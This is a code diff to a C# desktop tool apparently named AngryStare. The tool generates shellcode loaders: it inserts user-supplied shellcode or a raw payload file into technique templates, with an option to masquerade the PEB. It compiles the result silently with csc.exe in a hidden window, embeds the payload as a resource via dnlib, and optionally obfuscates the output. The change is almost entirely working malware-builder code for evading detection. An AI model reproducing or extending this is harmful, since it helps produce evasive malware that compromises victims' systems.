@@ -17,6 +17,7 @@ using System.Windows.Navigation;
 using System.Windows.Shapes;
 using Microsoft.Win32;
 using AngryStare.UI;
+using dnlib.DotNet;
 
 namespace AngryStare
 {
@@ -30,7 +31,7 @@ namespace AngryStare
         public string MasPebOriginFile;
         public string[] BufferString;
         public byte[] BuffByte;
-        public bool UseRaw = false;
+        public static bool UseRaw = false;
 
 
         public MainWindow()
@@ -45,7 +46,6 @@ namespace AngryStare
 
         }
 
-
         private void Button_Compiler_Click(object sender, RoutedEventArgs e)
         {
             ClearLog();
@@ -53,18 +53,23 @@ namespace AngryStare
             if (outputfile.Text == "") { Console.WriteLine("[!] ERROR : Choose a Target Folder"); return; }
             try
             {
-                DealWithShellcode.StackShellCode.StackGen(GetBuffer(), SelectTechPath + '\\' + Combo_Tech.Text, Combo_Tech.Text);
-                Console.WriteLine("[+] Generating template Successful");
+                if (UseRaw == true)
+                {
+                    Console.WriteLine($"[+] Use Raw: {Rawbinpath.Text}");
+                    DealWithShellcode.StackShellCode.StackGen(new byte[] { 0x00 }, SelectTechPath + '\\' + Combo_Tech.Text, Combo_Tech.Text);
+
+                }
+                else 
+                { 
+                    DealWithShellcode.StackShellCode.StackGen(GetBuffer(), SelectTechPath + '\\' + Combo_Tech.Text, Combo_Tech.Text);
+                    Console.WriteLine("[+] Generating template Successful");
+                }
             }
             catch (Exception ex) { Console.WriteLine(ex); }
-
-
             ///
             /// 写入Hattrick所需cs文件
             ///
             WirteProgramWithHT(SelectTechPath + '\\' + Combo_Tech.Text, Combo_Tech.SelectedItem.ToString(), MasPebOriginFile,(bool)MasqueradePEB.IsChecked);
-
-
 
             try
             {
@@ -73,7 +78,7 @@ namespace AngryStare
                     p.StartInfo = new ProcessStartInfo()
                     {
 
-                        FileName = @"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe",
+                        FileName = @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe",
                         UseShellExecute = false,
                         CreateNoWindow = true,
                         WindowStyle = ProcessWindowStyle.Hidden,
@@ -87,7 +92,30 @@ namespace AngryStare
                 
             }
             catch (Exception ex) { Console.WriteLine(ex); }
+
+            // 当使用bin为payload时需要编译完通过dnlib即时添加资源文件
+            if (UseRaw == true)
+            {
+                
+                ModuleDefMD module = ModuleDefMD.Load(outputfile.Text);
+                module.Resources.Add(new EmbeddedResource("dotnetlib", File.ReadAllBytes(Rawbinpath.Text)));
+                module.Write(outputfile.Text.TrimEnd('e'));
+                module.Dispose();
+                File.Delete(outputfile.Text);
+                File.Move(outputfile.Text.TrimEnd('e'), outputfile.Text);
+            }
+
+            //启用混淆
+            if (Simplyobfuscate.IsChecked == true) 
+            {
+                HatTrick.Obfuscate.obfuscateStart(outputfile.Text, outputfile.Text.TrimEnd('e'));
+                File.Delete(outputfile.Text);
+                File.Move(outputfile.Text.TrimEnd('e'), outputfile.Text);
+            }
+            
             Console.WriteLine($"[+] Complier Over : {outputfile.Text}");
+
+            DealWithShellcode.StackShellCode.StackGen(new byte[] {0x00}, SelectTechPath + '\\' + Combo_Tech.Text, Combo_Tech.Text);
 
         }
         public void SetCompilerBox()
@@ -110,14 +138,7 @@ namespace AngryStare
         }
         public byte[] GetBuffer()
         {
-            if ((Rawbinpath.Text != "") && shellcodeText.IsReadOnly)
-            {
-                BuffByte = File.ReadAllBytes(Rawbinpath.Text);
-                return BuffByte;
 
-            }
-            else
-            {
                 BufferString = shellcodeText.Text.Split(',');
                 List<byte> BufferList = new List<byte>();
 
@@ -134,7 +155,7 @@ namespace AngryStare
                 BuffByte = BufferList.ToArray();
 
                 return BuffByte;
-            }
+            
         }
 
         private void Combo_Tech_SelectionChanged(object sender, SelectionChangedEventArgs e)
